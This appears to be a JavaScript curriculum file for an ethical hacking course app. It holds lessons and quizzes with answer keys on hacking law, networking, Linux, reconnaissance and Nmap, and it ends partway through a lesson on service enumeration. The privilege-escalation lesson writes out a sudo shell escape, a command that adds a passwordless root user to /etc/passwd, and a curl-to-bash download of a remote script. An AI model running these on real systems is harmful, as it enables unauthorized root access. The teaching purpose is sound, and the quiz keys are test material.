// HackAcademy — Complete Curriculum
// 15 Modules | 45+ Lessons | 300+ Questions
// From Script Kiddie → Nation's Guardian 🇧🇩

export const MODULES = [
  /* ══════════════════════════════════════════════════════════
   * MODULE 1 — HACKER FOUNDATIONS
   * ══════════════════════════════════════════════════════════ */
  {
    id:"m1", title:"Hacker Foundations", emoji:"🔓",
    color:"#00ff41", xp:500, desc:"Ethics, mindset & legal framework",
    unlocked:true,
    lessons:[
      { id:"m1l1", title:"What is Ethical Hacking?", xp:60,
        content:[
          {t:"h", v:"// LESSON 01: ETHICAL HACKING DECODED"},
          {t:"p", v:"Ethical hacking is the AUTHORIZED practice of finding vulnerabilities before malicious hackers can exploit them. You think and act like an attacker — but with written permission and a mission to protect."},
          {t:"terms", v:[["⬛ Black Hat","Attacks illegally. Criminal. Goes to prison."],["⬜ White Hat","Authorized ethical hacker. Protects systems. Gets paid well."],["⬛⬜ Grey Hat","No malicious intent but may act without authorization."]]},
          {t:"p", v:"The 5 Phases of Ethical Hacking (memorize this!):"},
          {t:"list", v:["🔍 Reconnaissance — Silent intel gathering about the target","📡 Scanning — Discover open ports, services, vulnerabilities","💥 Gaining Access — Exploit discovered vulnerabilities","🏠 Maintaining Access — Persistence on compromised system","🧹 Covering Tracks — Remove evidence of intrusion"]},
          {t:"code", v:"# Golden Rule of Ethical Hacking:\n# NEVER touch a system without WRITTEN PERMISSION\n# Unauthorized access = CRIMINAL OFFENSE\n# Protect Bangladesh 🇧🇩 — Don't destroy it!"},
        ],
        quiz:[
          {q:"What distinguishes a White Hat from a Black Hat?",a:["Skill level","Written authorization","The OS they use","Their country"],c:1},
          {q:"First phase of ethical hacking?",a:["Scanning","Exploitation","Reconnaissance","Reporting"],c:2},
          {q:"Hacking without written permission is?",a:["Grey hat activity","A criminal offense","Allowed if you report","Required for certification"],c:1},
          {q:"Black hat hackers are?",a:["Defenders of systems","Criminal unauthorized attackers","Security researchers","Government workers"],c:1},
          {q:"Covering Tracks in hacking means?",a:["Deleting your OS","Removing evidence of intrusion","Covering open ports","Encrypting the target"],c:1},
        ]
      },
      { id:"m1l2", title:"Hacker Mindset & Career Paths", xp:70,
        content:[
          {t:"h", v:"// LESSON 02: THINK LIKE A HACKER"},
          {t:"p", v:"Real hackers don't just run tools — they THINK. They question every assumption, understand systems at every layer, and discover paths others miss entirely."},
          {t:"tip", v:'"Think like an attacker. Defend like a professional." — Security Mantra'},
          {t:"p", v:"Ethical hacking career paths available to you:"},
          {t:"list", v:["🔴 Red Teamer — Simulate real attacks on organizations","🔵 Blue Teamer — Defend systems, monitor, respond to attacks","💜 Purple Teamer — Bridge between Red & Blue teams","🐛 Bug Bounty Hunter — Find bugs in programs and get paid","🔍 VAPT Analyst — Vulnerability Assessment & Penetration Testing","🏛️ SOC Analyst — Security Operations Center monitoring"]},
          {t:"code", v:"# Certification Roadmap:\neJPT         ← BEGINNER: Start here! (eLearnSecurity)\nCEH          ← INTERMEDIATE: (EC-Council)\nOSCP         ← ADVANCED: Gold standard (Offensive Security)\nOSEP/OSED    ← EXPERT: Evasion & exploitation dev\nGXPN/GCIH    ← GIAC certifications\n\n# BD-Relevant: BGD e-GOV CIRT, BTRC, BFIU hiring hackers!"},
          {t:"p", v:"In Bangladesh, the BGDEGOV CIRT (Computer Incident Response Team) actively recruits ethical hackers to defend national infrastructure. Your skills protect millions of Bangladeshis."},
        ],
        quiz:[
          {q:"Scope of Engagement document defines?",a:["Payment terms","What systems can be tested","Which tools to use","Report format"],c:1},
          {q:"Best certification for absolute beginners?",a:["OSCP","CEH","eJPT","CISSP"],c:2},
          {q:"Red team role means?",a:["Defend systems","Simulate attacks","Write policies","Monitor logs"],c:1},
          {q:"Bug bounty hunters get paid for?",a:["Writing exploits","Finding & reporting vulnerabilities","Crashing systems","Selling zero-days"],c:1},
          {q:"OSCP is known as?",a:["Easiest cert","Most popular","Gold standard for pentesters","Government cert"],c:2},
        ]
      },
      { id:"m1l3", title:"Legal Framework — BD & Global Laws", xp:80,
        content:[
          {t:"h", v:"// LESSON 03: KNOW THE LAW BEFORE YOU HACK"},
          {t:"warn", v:"⚠️ Bangladesh Digital Security Act 2018 (DSA) — Unauthorized access to computers = up to 14 years imprisonment and/or heavy fines. ICT Act 2006 also applies. IGNORANCE IS NO DEFENSE."},
          {t:"p", v:"Key Bangladesh laws for ethical hackers:"},
          {t:"list", v:["Digital Security Act 2018 — Covers all cybercrimes, up to 14 yrs","ICT Act 2006 Section 54 — Unauthorized computer access","Telecommunication Act 2001 — Network interference","Penal Code Section 379 — Digital theft"]},
          {t:"code", v:"# LEGAL Practice Environments:\ntryhackme.com     ← #1 beginner platform\nhackthebox.com   ← Intermediate/Advanced\nvulnhub.com      ← Download & practice VMs\nbugcrowd.com     ← Legal bug bounties\nhackerone.com    ← More bug bounties\n\n# Home Lab (100% legal):\nVirtualBox + Metasploitable2  ← Intentionally vulnerable\nVirtualBox + DVWA             ← Web app practice\nVirtualBox + VulnHub VMs     ← CTF-style targets\n\n# ALWAYS get signed pentest agreement first!"},
          {t:"p", v:"A penetration test agreement MUST include: scope (exact IPs/domains), timeline, emergency contacts, data handling, rules of engagement, and liability clauses. Never start without this document signed by an authorized executive."},
        ],
        quiz:[
          {q:"Bangladesh law covering unauthorized hacking?",a:["Constitution 1971","Digital Security Act 2018","Cyber Crime Act 2010","Penal Code Section 54"],c:1},
          {q:"Best legal beginner practice platform?",a:["Random websites","Neighbor's WiFi","TryHackMe","Corporate networks"],c:2},
          {q:"Bug bounty programs are?",a:["Illegal hacking","Authorized paid vulnerability finding","Government surveillance","Malware distribution"],c:1},
          {q:"DSA 2018 maximum prison term?",a:["2 years","7 years","14 years","Life"],c:2},
          {q:"VulnHub primarily provides?",a:["Live targets","Vulnerable downloadable VMs","Online labs only","Certifications"],c:1},
        ]
      },
    ],
    test:[
      {q:"Ethical hacker = ___ hacker",a:["Black Hat","White Hat","Grey Hat","Red Hat"],c:1},
      {q:"'Pentesting' stands for?",a:["Pentagon Testing","Penetration Testing","Peripheral Testing","Power Testing"],c:1},
      {q:"Phase AFTER Gaining Access?",a:["Scanning","Reconnaissance","Maintaining Access","Reporting"],c:2},
      {q:"TryHackMe provides?",a:["Illegal targets","Legal controlled labs","DDoS targets","Phishing kits"],c:1},
      {q:"Required document before any pentest?",a:["NDA only","Signed Authorization/Scope letter","Your resume","Certification"],c:1},
      {q:"BD Digital Security Act max penalty?",a:["2 years","7 years","14 years","Life"],c:2},
      {q:"BGDEGOV CIRT stands for?",a:["Bangladesh Government Cyber Response","BD Govt Computer Incident Response Team","Bangladesh Global Cyber IT","BD General Computer Intel Team"],c:1},
    ]
  },

  /* ══════════════════════════════════════════════════════════
   * MODULE 2 — NETWORKING FOR HACKERS
   * ══════════════════════════════════════════════════════════ */
  {
    id:"m2", title:"Networking for Hackers", emoji:"🌐",
    color:"#00bfff", xp:600, desc:"OSI, TCP/IP, ports, protocols & subnetting",
    lessons:[
      { id:"m2l1", title:"OSI Model — Every Layer is an Attack Surface", xp:70,
        content:[
          {t:"h", v:"// OSI MODEL: 7 LAYERS = 7 ATTACK VECTORS"},
          {t:"p", v:"Understanding OSI is not just theory — every layer represents a distinct attack surface. Professional hackers understand WHERE in the stack an attack happens."},
          {t:"code", v:"L7  Application  → HTTP, FTP, DNS, SMTP, SNMP\nL6  Presentation → SSL/TLS, Encoding, Compression\nL5  Session      → NetBIOS, RPC, PPTP\nL4  Transport    → TCP, UDP (PORTS live here!)\nL3  Network      → IP, ICMP, ARP, Routing\nL2  Data Link    → Ethernet, MAC, ARP, Switches\nL1  Physical     → Cables, WiFi Radio, Hubs\n\nMnemonic: 'All People Seem To Need Data Processing'"},
          {t:"p", v:"Real attacks mapped to OSI layers:"},
          {t:"list", v:["L7: SQLi, XSS, Command Injection, SSRF, API attacks","L6: SSL stripping, downgrade attacks, protocol confusion","L5: Session hijacking, session fixation","L4: Port scanning, SYN flood DoS, UDP flood","L3: IP spoofing, ICMP ping flood, routing attacks","L2: ARP poisoning/spoofing, MAC flooding, 802.1Q attacks","L1: Physical keylogger, rogue WiFi access points, wiretapping"]},
        ],
        quiz:[
          {q:"IP addressing lives at which OSI layer?",a:["L2 Data Link","L3 Network","L4 Transport","L7 Application"],c:1},
          {q:"TCP/UDP (PORTS) operate at?",a:["L3 Network","L4 Transport","L7 Application","L2 Data Link"],c:1},
          {q:"ARP poisoning attacks which layer?",a:["L7","L4","L2","L1"],c:2},
          {q:"SSL/TLS operates at which layer?",a:["L3","L4","L6","L7"],c:2},
          {q:"SYN flood attacks which layer?",a:["L2","L3","L4","L7"],c:2},
        ]
      },
      { id:"m2l2", title:"TCP/IP Stack & Critical Ports", xp:80,
        content:[
          {t:"h", v:"// TCP/IP: THE INTERNET'S CORE — AND ITS WEAKNESSES"},
          {t:"p", v:"TCP's reliability mechanisms are what make session hijacking, port scanning, and DoS attacks possible. Understand how connections work to understand how to attack them."},
          {t:"code", v:"# TCP 3-Way Handshake:\nClient → [SYN]     → Server   # I want to connect\nClient ← [SYN/ACK] ← Server   # OK, acknowledged\nClient → [ACK]     → Server   # Connection OPEN!\n\n# Half-open scan (nmap -sS):\nClient → [SYN] → Server\nClient ← [SYN/ACK] ← Server\nClient → [RST]     ← Never completes! # Stealthy"},
          {t:"code", v:"# CRITICAL PORTS — KNOW ALL OF THESE:\n20,21  FTP    ← File transfer (often anon login!)\n22     SSH    ← Brute force & key attacks\n23     Telnet ← CLEARTEXT — sniff credentials!\n25     SMTP   ← Email (open relay abuse)\n53     DNS    ← Zone transfer, DNS poisoning\n80     HTTP   ← All web attacks\n110    POP3   ← Email retrieval\n143    IMAP   ← Email (cleartext possible)\n443    HTTPS  ← Web + SSL/TLS attacks\n445    SMB    ← EternalBlue (MS17-010)!\n3306   MySQL  ← DB exposed to internet!\n3389   RDP    ← BlueKeep, brute force\n5900   VNC    ← Often no auth!\n8080   HTTP   ← Alt web server / proxy\n8443   HTTPS  ← Alt SSL"},
          {t:"tip", v:"In any pentest: always do a FULL port scan (-p-). Admins hide services on non-standard ports thinking nobody will find them!"},
        ],
        quiz:[
          {q:"First packet in TCP 3-way handshake?",a:["ACK","SYN","SYN-ACK","FIN"],c:1},
          {q:"SSH default port?",a:["21","23","22","25"],c:2},
          {q:"Port 445 is used for?",a:["MySQL","FTP","SSH","SMB"],c:3},
          {q:"Telnet is insecure because?",a:["It is slow","Traffic is cleartext","It uses UDP","Port 23 is blocked"],c:1},
          {q:"EternalBlue exploits which port/service?",a:["FTP port 21","SSH port 22","SMB port 445","RDP port 3389"],c:2},
        ]
      },
      { id:"m2l3", title:"Subnetting, DNS & Key Protocols", xp:80,
        content:[
          {t:"h", v:"// PROTOCOLS & SUBNETTING: YOUR NETWORK MAP"},
          {t:"code", v:"# Private IP Ranges (RFC 1918):\n10.0.0.0/8        ← Large enterprises (16M hosts)\n172.16.0.0/12     ← Medium orgs (1M hosts)\n192.168.0.0/16    ← Small/home networks (65K hosts)\n\n# CIDR Quick Reference:\n/24 = 256 IPs  (255.255.255.0)\n/25 = 128 IPs  (255.255.255.128)\n/26 = 64 IPs   (255.255.255.192)\n/30 = 4 IPs    (point-to-point links!)\n/32 = 1 IP     (single host)"},
          {t:"code", v:"# DNS — How Hackers Abuse It:\n# Zone Transfer (misconfiguration = JACKPOT):\nnslookup\n> server target.com\n> ls -d target.com  ← Full DNS zone dump!\n\ndig axfr @ns1.target.com target.com  ← Same\n\n# DNS Records attackers love:\nA      → Domain to IP\nMX     → Mail servers (spear phishing!)\nTXT    → SPF, DKIM (email security config)\nCNAME  → Subdomain takeover possible!\nNS     → Name servers"},
          {t:"warn", v:"⚠️ DNS Zone Transfer vulnerability exposes ALL subdomains, IP addresses, and mail servers. Always check: dig axfr @nameserver domain.com"},
        ],
        quiz:[
          {q:"/24 = how many total IP addresses?",a:["128","512","256","1024"],c:2},
          {q:"Which IP is private (RFC 1918)?",a:["8.8.8.8","192.168.1.1","45.33.32.156","1.1.1.1"],c:1},
          {q:"DNS Zone Transfer leaks?",a:["Passwords","All domain records and IPs","Firewall rules","User accounts"],c:1},
          {q:"/32 represents?",a:["Full internet","A /16 subnet","Single host IP","32 subnets"],c:2},
          {q:"MX DNS records reveal?",a:["IP addresses","Mail servers — great for phishing recon","SSH servers","FTP servers"],c:1},
        ]
      },
    ],
    test:[
      {q:"OSI has how many layers?",a:["4","5","6","7"],c:3},
      {q:"TCP is described as?",a:["Connectionless","Connection-oriented (reliable)","Broadcast-based","Wireless protocol"],c:1},
      {q:"DNS default port?",a:["80","443","53","22"],c:2},
      {q:"Port 3389 is used for?",a:["MySQL","FTP","SSH","RDP"],c:3},
      {q:"SYN flood is a DoS attacking?",a:["Application L7","Layer 3 IP","Layer 4 TCP","Layer 2 MAC"],c:2},
      {q:"ARP spoofing attacks which layer?",a:["L7","L4","L2","L1"],c:2},
      {q:"Nmap -sS (SYN scan) uses what handshake?",a:["Full 3-way","RST after SYN/ACK — half open","No handshake","ACK only"],c:1},
    ]
  },

  /* ══════════════════════════════════════════════════════════
   * MODULE 3 — LINUX FOR HACKERS
   * ══════════════════════════════════════════════════════════ */
  {
    id:"m3", title:"Linux for Hackers", emoji:"🐧",
    color:"#ff6b00", xp:700, desc:"Kali mastery, permissions, bash scripting & automation",
    lessons:[
      { id:"m3l1", title:"Kali Linux — Terminal Mastery", xp:80,
        content:[
          {t:"h", v:"// KALI LINUX: YOUR HACKING WEAPON"},
          {t:"p", v:"Kali Linux has 600+ pre-installed security tools. The terminal is your ONLY weapon — master it completely. No mouse needed in a real pentest."},
          {t:"code", v:"# NAVIGATION:\npwd                  # Print working directory\nls -la               # List ALL files (including hidden .files)\ncd /path/to/dir      # Change directory\ncd ..                # Up one level\ncd ~                 # Home directory\nfind / -name '*.txt' # Find files by name\n\n# FILE OPERATIONS:\ncat file.txt          # Read file\nnano / vim file.txt   # Edit file\ncp src dest           # Copy\nmv src dest           # Move / rename\nrm -rf dir/           # Delete recursively (DANGEROUS!)\nchmod +x script.sh    # Make executable\nwget URL              # Download file\ncurl -O URL           # Download file\n\n# SYSTEM INFO:\nuname -a              # Kernel info\nwhoami                # Current user\nid                    # UID + groups\nip addr / ifconfig    # Network interfaces\nhostname              # Machine name\nenv                   # Environment variables\nps aux                # Running processes\ndf -h                 # Disk space\nfree -h               # RAM usage"},
          {t:"tip", v:"💡 PRACTICE: Open the Terminal tab right now and type every command you see. Muscle memory = hacker speed."},
        ],
        quiz:[
          {q:"Show current directory?",a:["ls","cd","pwd","whoami"],c:2},
          {q:"ls -la shows?",a:["Only directories","All files including hidden ones","Large files only","Log files"],c:1},
          {q:"Read a text file in terminal?",a:["read f.txt","open f.txt","cat f.txt","view f.txt"],c:2},
          {q:"ip addr command shows?",a:["Target website IPs","Your network interfaces","Internet speed","DNS servers"],c:1},
          {q:"rm -rf does?",a:["Read files recursively","Force delete recursively (DANGEROUS)","Remove firewall","Run a file"],c:1},
        ]
      },
      { id:"m3l2", title:"Permissions, SUID & Privilege Escalation", xp:90,
        content:[
          {t:"h", v:"// LINUX PERMISSIONS: HACKER'S GOLD MINE"},
          {t:"p", v:"Misconfigured file permissions are one of the TOP privilege escalation vectors in the real world. Every pentester enumerates these from the moment they get a shell."},
          {t:"code", v:"# Permission String: [type][owner][group][others]\n# Example: -rwxr-xr--\n# r=read(4)  w=write(2)  x=execute(1)\n\nchmod 777 file   # rwxrwxrwx — EVERYONE full access (DANGEROUS)\nchmod 755 file   # rwxr-xr-x — Normal executable\nchmod 644 file   # rw-r--r-- — Normal file\nchmod 600 file   # rw------- — Private (SSH keys!)\nchmod 400 file   # r-------- — Read-only sensitive\n\n# Special bits:\nSUID (4000) — Runs as FILE OWNER, not you\nSGID (2000) — Runs as file GROUP\nSticky(1000)— Only owner can delete (e.g. /tmp)"},
          {t:"code", v:"# PRIVILEGE ESCALATION CHECKLIST:\n# 1. Current identity:\nid && whoami\n\n# 2. Sudo rights (MOST COMMON VECTOR!):\nsudo -l\n# → sudo vim? Exploit: sudo vim -c ':!/bin/bash'\n\n# 3. SUID binaries (run as owner = often root!):\nfind / -perm -4000 2>/dev/null\n# → Check each at: https://gtfobins.github.io\n\n# 4. Cron jobs (writable scripts = instant root!):\ncat /etc/crontab\ncrontab -l\nls -la /etc/cron*\n\n# 5. Writable /etc/passwd (add root user!):\nls -la /etc/passwd\n# If writable: echo 'h4x0r::0:0::/root:/bin/bash' >> /etc/passwd\n# su h4x0r  ← ROOT!\n\n# 6. Automated enumeration:\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash\n\n# VISIT: https://gtfobins.github.io — BOOKMARK IT!"},
          {t:"warn", v:"🔥 SUID + sudo misconfiguration = ROOT access. ALWAYS enumerate these the moment you get a shell."},
        ],
        quiz:[
          {q:"chmod 777 grants everyone?",a:["Read only","Execute only","Full read/write/execute (rwxrwxrwx)","No permissions"],c:2},
          {q:"sudo -l shows?",a:["File listing","User list","Your sudo privileges","Log entries"],c:2},
          {q:"/etc/shadow requires which permission to read normally?",a:["User","Group","Root/sudo access","World-readable"],c:2},
          {q:"SUID bit makes a binary run with?",a:["Your privileges","File owner's privileges","Group privileges","World privileges"],c:1},
          {q:"linpeas.sh automates?",a:["Network scanning","Linux privilege escalation enumeration","Password cracking","Web exploitation"],c:1},
        ]
      },
      { id:"m3l3", title:"Bash Scripting & Hacking Automation", xp:100,
        content:[
          {t:"h", v:"// BASH: AUTOMATE YOUR ENTIRE ATTACK CHAIN"},
          {t:"p", v:"Professional hackers automate repetitive tasks with Bash. This turns a 2-hour manual recon into a 5-minute script. This is what separates amateurs from pros."},
          {t:"code", v:"#!/bin/bash\n# ============================================\n# Full Auto-Recon Script\n# Usage: bash recon.sh <TARGET_IP>\n# ============================================\nTARGET=$1\nOUTPUT=\"recon_$TARGET\"\nmkdir -p $OUTPUT\n\necho \"[*] === HACK ACADEMY AUTO-RECON ===\"\necho \"[*] Target: $TARGET\"\necho \"[*] Started: $(date)\"\n\n# Phase 1: Quick scan\necho \"[*] Phase 1: Quick port scan...\"\nnmap -sC -sV -oN $OUTPUT/quick.txt $TARGET\n\n# Phase 2: Full port scan\necho \"[*] Phase 2: Full port scan...\"\nnmap -p- --min-rate 5000 -oN $OUTPUT/full.txt $TARGET\n\n# Phase 3: Web recon (if port 80/443 open)\nif grep -q '80/tcp.*open\\|443/tcp.*open' $OUTPUT/quick.txt; then\n  echo \"[*] Phase 3: Web recon...\"\n  gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt \\\n    -o $OUTPUT/gobuster.txt 2>/dev/null\n  nikto -h http://$TARGET -o $OUTPUT/nikto.txt 2>/dev/null\nfi\n\necho \"[+] Recon complete! Results in $OUTPUT/\""},
          {t:"code", v:"# ── USEFUL ONE-LINERS ──────────────────────────────────\n\n# Ping sweep:\nfor i in {1..254}; do\n  ping -c1 -W1 192.168.1.$i &>/dev/null && echo \"[+] UP: 192.168.1.$i\" &\ndone; wait\n\n# Extract all IPs from a file:\ngrep -oP '\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b' file.txt | sort -u\n\n# Find world-writable files:\nfind / -perm -o+w -type f 2>/dev/null | grep -v proc\n\n# Monitor for new files in /tmp:\nwatch -n 2 'ls -lat /tmp | head -20'\n\n# Quick HTTP header grab:\nfor ip in $(cat ips.txt); do echo \"=== $ip ===\"; curl -sI http://$ip 2>/dev/null | head -5; done"},
        ],
        quiz:[
          {q:"$1 in a bash script refers to?",a:["Line 1","First command-line argument","Process ID","Script name ($0)"],c:1},
          {q:"chmod +x script.sh does?",a:["Edit the file","Makes it executable","Encrypts it","Compresses it"],c:1},
          {q:"#!/bin/bash at script start is called?",a:["Comment","Shebang — tells OS which interpreter","End of script","Module import"],c:1},
          {q:"2>/dev/null in a command does?",a:["Duplicate output to 2 files","Redirects stderr to null (hides errors)","Sends output to port 2","Logs errors to null"],c:1},
          {q:"& at end of command does?",a:["Background process","Duplicate the command","AND condition","Kill the process"],c:0},
        ]
      },
    ],
    test:[
      {q:"Kali Linux has approximately how many tools?",a:["100+","300+","600+","1000+"],c:2},
      {q:"chmod 600 means?",a:["rwxrwxrwx","rw-r--r--","rw-------","rwxr-xr-x"],c:2},
      {q:"Run a command as root?",a:["admin <cmd>","root <cmd>","sudo <cmd>","su -c <cmd>"],c:2},
      {q:"/etc/shadow contains?",a:["Network config","Hashed passwords","System logs","User list"],c:1},
      {q:"find / -perm -4000 2>/dev/null finds?",a:["All files","SUID binaries (key privesc vector)","Hidden files","Executable scripts"],c:1},
      {q:"First line of every bash script?",a:["# This is a comment","#!/bin/bash","bash --start","echo 'start'"],c:1},
      {q:"GTFObins.github.io is used for?",a:["Bug reports","Exploiting SUID/sudo binaries for privesc","Generating wordlists","Scanning vulnerabilities"],c:1},
    ]
  },

  /* ══════════════════════════════════════════════════════════
   * MODULE 4 — RECONNAISSANCE
   * ══════════════════════════════════════════════════════════ */
  {
    id:"m4", title:"Reconnaissance", emoji:"🔍",
    color:"#ff00ff", xp:800, desc:"OSINT, Google Dorking, Nmap & web fingerprinting",
    lessons:[
      { id:"m4l1", title:"Passive Recon & OSINT", xp:90,
        content:[
          {t:"h", v:"// PASSIVE RECON: GHOST MODE — ZERO FOOTPRINT"},
          {t:"p", v:"Passive recon = gathering maximum intelligence WITHOUT ever touching the target. No logs on their servers. No alerts on their IDS. Pure intelligence gathering."},
          {t:"list", v:["WHOIS — Domain ownership, registrar, contacts, creation date","Google/Bing Dorking — Advanced search operators for sensitive data","Shodan.io — Internet-connected device search engine","theHarvester — Emails, subdomains, employee names, IPs","Maltego — Visual OSINT mapping & relationship analysis","Wayback Machine — Historical snapshots of websites","LinkedIn/Social — Employee enumeration for social engineering","crt.sh — Certificate transparency logs (find ALL subdomains!)","Hunter.io — Find email formats and addresses","Recon-ng — Full OSINT framework like Metasploit"]},
          {t:"code", v:"# GOOGLE DORKING (100% Legal — Google is public):\nsite:target.com                    # All indexed pages\nsite:target.com filetype:pdf       # PDF documents\nsite:target.com inurl:admin        # Admin panels!\nsite:target.com inurl:login        # Login pages\nintitle:\"index of\" site:target.com # Directory listings!\n\"@target.com\" filetype:xls         # Excel with emails\nsite:target.com ext:php inurl:?    # PHP params\nintext:\"password\" site:target.com  # Pages with 'password'\nsite:pastebin.com target.com       # Leaked data!\n\n# SHODAN DORKS:\norg:\"Target Company\"\nhostname:target.com\nport:22 country:BD   ← Exposed SSH in Bangladesh!\nport:3306 country:BD ← Exposed MySQL databases!\n\"default password\"   ← Devices with default creds!"},
          {t:"tip", v:"Pro tip: Spend 50-60% of your engagement on recon. More intel = smarter attack = less noise = harder to detect."},
        ],
        quiz:[
          {q:"Passive recon means?",a:["Scan ports aggressively","Gather info without directly touching target","Run exploits","Call employees"],c:1},
          {q:"'site:x.com filetype:pdf' Google dork finds?",a:["All websites","PDF files indexed on x.com","Password files","Admin pages"],c:1},
          {q:"Shodan.io is known as?",a:["Social media platform","Search engine for internet-connected devices","Password cracker","Port scanner"],c:1},
          {q:"crt.sh is used for finding?",a:["SSL vulnerabilities","All subdomains via cert transparency","Open ports","Source code"],c:1},
          {q:"Why spend ~60% on recon?",a:["It is easier","More intel = smarter quieter attack","Required by law","Tools need warmup time"],c:1},
        ]
      },
      { id:"m4l2", title:"Nmap — The Complete Scanner", xp:110,
        content:[
          {t:"h", v:"// NMAP: YOUR #1 SCANNING WEAPON"},
          {t:"p", v:"Nmap (Network Mapper) is THE essential hacking tool. Discovers hosts, open ports, services, versions, OS fingerprints, and runs NSE scripts for vulnerability detection."},
          {t:"code", v:"# ── BASIC SCANS ───────────────────────────────────────\nnmap 192.168.1.1              # Basic TCP scan\nnmap 192.168.1.0/24           # Whole subnet\nnmap -iL targets.txt          # Scan from file\nnmap -sn 192.168.1.0/24       # Ping sweep (no port scan)\n\n# ── STANDARD PENTEST COMBO (memorize this!) ────────\nnmap -sC -sV -oN scan.txt TARGET\n# -sC = default scripts  -sV = version detection  -oN = save output\n\n# ── FULL PORT SCAN (find hidden services!) ──────────\nnmap -p- --min-rate 5000 -oN fullscan.txt TARGET\n\n# ── STEALTH SCAN OPTIONS ────────────────────────────\nnmap -sS TARGET      # SYN scan (root required) — half-open, stealthy\nnmap -sT -Pn TARGET  # Full TCP (use on Termux/no-root!) \nnmap -sU TARGET      # UDP scan (slow, finds DNS/SNMP/TFTP)\nnmap -T1 TARGET      # Paranoid speed — evade IDS/IPS\n\n# ── AGGRESSIVE MODE ─────────────────────────────────\nnmap -A TARGET       # OS + version + scripts + traceroute\nnmap -sC -sV -p- -A -oA fullrecon TARGET  # EVERYTHING"},
          {t:"code", v:"# ── NSE SCRIPTS (Nmap Scripting Engine) ────────────\n# Vuln scanning:\nnmap --script vuln TARGET\n\n# SMB enumeration:\nnmap --script smb-enum-shares,smb-enum-users TARGET\n\n# HTTP enumeration:\nnmap --script http-title,http-headers TARGET\n\n# FTP anonymous login check:\nnmap --script ftp-anon TARGET\n\n# Default credentials check:\nnmap --script=default TARGET\n\n# All scripts for a specific category:\nnmap --script='discovery and safe' TARGET"},
          {t:"tip", v:"📱 On Termux (Android): ALWAYS use -sT -Pn — Termux lacks raw socket permissions needed for SYN scan."},
        ],
        quiz:[
          {q:"nmap -sV flag does?",a:["SYN scan","Service and version detection","Vulnerability scan","Script scan"],c:1},
          {q:"Scan ALL 65535 ports?",a:["-p 65535","-p-","-p all","--all-ports"],c:1},
          {q:"On Termux, correct scan flag?",a:["-sS (SYN)","-sU (UDP)","-sT -Pn (TCP)","--no-root"],c:2},
          {q:"nmap -sn performs?",a:["Service scan","Script scan","Ping sweep (host discovery)","Stealth scan"],c:2},
          {q:"nmap -oA saves output as?",a:["Only XML","Only normal text","All formats (normal, XML, grepable)","Only JSON"],c:2},
        ]
      },
      { id:"m4l3", title:"Web Fingerprinting & Active Recon", xp:90,
        content:[
          {t:"h", v:"// ACTIVE RECON: MAP THE TARGET COMPLETELY"},
          {t:"p", v:"Active recon means direct interaction with the target. This WILL create logs — so be surgical and know what you're looking for."},
          {t:"code", v:"# ── DIRECTORY/FILE BRUTE FORCE ─────────────────────\ngobuster dir -u http://target.com \\\n  -w /usr/share/wordlists/dirb/common.txt \\\n  -x php,html,txt,bak,zip \\\n  -o gobuster.txt\n\nferoxbuster -u http://target.com -w wordlist.txt  # Faster alternative\n\n# ── WEB VULNERABILITY SCANNER ───────────────────────\nnikto -h http://target.com -o nikto.txt\n\n# ── SUBDOMAIN ENUMERATION ────────────────────────────\nsubfinder -d target.com -o subs.txt\nassetfinder --subs-only target.com >> subs.txt\namass enum -d target.com >> subs.txt\n\n# Brute force subdomains:\ngobuster dns -d target.com \\\n  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n\n# ── WEB HEADERS ANALYSIS ────────────────────────────\ncurl -I http://target.com         # HTTP headers\ncurl -v http://target.com 2>&1    # Full request/response\nwhatweb http://target.com         # Tech fingerprint\nwafw00f http://target.com         # WAF detection"},
          {t:"warn", v:"⚠️ Active recon WILL appear in target logs. In a real pentest, ensure you're within scope before running these tools."},
        ],
        quiz:[
          {q:"gobuster dir does?",a:["DNS enumeration","Directory/file brute forcing","Port scanning","Password cracking"],c:1},
          {q:"whatweb tool identifies?",a:["Security vulnerabilities","Web technologies (CMS, frameworks, versions)","SQL injections","Open ports"],c:1},
          {q:"nikto is primarily used for?",a:["Port scanning","Web vulnerability scanning","Password cracking","Email harvesting"],c:1},
          {q:"wafw00f detects?",a:["WiFi firewalls","Web Application Firewalls (WAF)","SQL injections","DNS firewalls"],c:1},
          {q:"subfinder/amass are used for?",a:["Subdomain enumeration","File scanning","Port discovery","Password attacks"],c:0},
        ]
      },
    ],
    test:[
      {q:"Tool best for email/subdomain OSINT?",a:["Nmap","theHarvester","Metasploit","Burp Suite"],c:1},
      {q:"Google dork 'inurl:admin' finds?",a:["Admin email addresses","Admin panel URLs","Admin tools","Admin users"],c:1},
      {q:"nmap -A enables?",a:["Anonymous mode","All 65535 ports","Aggressive (OS+version+scripts+traceroute)","ARP scan only"],c:2},
      {q:"Passive recon leaves on target?",a:["IDS alerts","No traces on target","Firewall alerts","Web server logs"],c:1},
      {q:"crt.sh is used for?",a:["Cracking certs","Finding subdomains via cert transparency","SSL testing","Generating certs"],c:1},
      {q:"nmap -sn performs?",a:["Service scan","SYN scan","Ping sweep host discovery","Script scan"],c:2},
      {q:"Standard pentest nmap combo?",a:["-sU -oX","-sC -sV -oN","-p- -A only","-sS -T5"],c:1},
    ]
  },

  /* ══════════════════════════════════════════════════════════
   * MODULE 5 — SCANNING & VULNERABILITY ANALYSIS
   * ══════════════════════════════════════════════════════════ */
  {
    id:"m5", title:"Scanning & Vulnerability Analysis", emoji:"📡",
    color:"#ffcc00", xp:700, desc:"Enumeration, vulnerability scanners & CVE research",
    lessons:[
      { id:"m5l1", title:"Service Enumeration Deep Dive", xp:80,
        content:[
          {t:"h", v:"// ENUMERATION: EXTRACT EVERYTHING FROM EVERY SERVICE"},
          {t:"p", v:"Enumeration is the systematic extraction of all information from discovered services. The more you enumerate, the more attack surface you find."},
